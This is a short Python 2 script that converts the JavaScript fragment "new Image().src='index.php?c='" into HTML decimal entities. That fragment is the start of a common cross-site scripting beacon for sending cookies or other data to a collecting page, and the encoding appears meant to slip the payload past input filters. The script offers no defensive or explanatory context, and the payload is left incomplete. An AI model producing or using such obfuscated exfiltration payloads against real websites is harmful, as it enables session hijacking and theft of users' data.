ss = "new Image().src='index.php?c='"

xx=[]

for s in ss:
    xx.append('&#'+str(ord(s))+';')

print ''.join(xx)